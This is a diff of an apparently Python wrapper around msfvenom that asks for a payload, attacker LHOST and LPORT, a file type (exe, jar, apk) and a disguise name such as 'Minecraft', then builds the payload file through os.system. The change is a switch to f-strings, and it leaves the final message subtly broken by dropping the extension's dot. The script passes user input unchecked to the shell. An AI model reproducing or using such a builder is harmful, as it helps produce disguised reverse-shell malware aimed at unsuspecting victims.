@@ -23,11 +23,11 @@ def banner():
 """)
 os.system("clear")
 banner()
-payload = input(C+"Payload: "+W)
-host = input(C+"LHOST: "+W)
-port = input(C+"LPORT: "+W)
-ex = input(B+"Extension (ej: exe,jar,apk, etc): "+W)
-output = input(G+"OUTPUT(ex: Minecraft):"+W)
+payload = input(f"{C}Payload: {W}")
+host = input(f"{C}LHOST: {W}")
+port = input(f"{C}LPORT: {W}")
+ex = input(f"{B}Extension (ej: exe,jar,apk, etc): {W}")
+output = input(f"{G}OUTPUT(ex: Minecraft):{W}")
 os.system("clear")
 banner()
 if ex == "apk":
@@ -37,6 +37,6 @@ elif "apk" in ex:
 else:
 	command = os.system("msfvenom -p "+payload+" LHOST="+host+" LPORT="+port+" -f "+ex+" -o "+output+"."+ex)
 if command == 32512:
-	print(R+"[-] Error.")
+	print(f"{R}[-] Error.")
 if command == 0:
-	print(G+"[INFO]"+W+" File Created: "+P+output+"."+ex)
+	print(f"{G}[INFO]{W} File Created: {P}{output}{ex}")
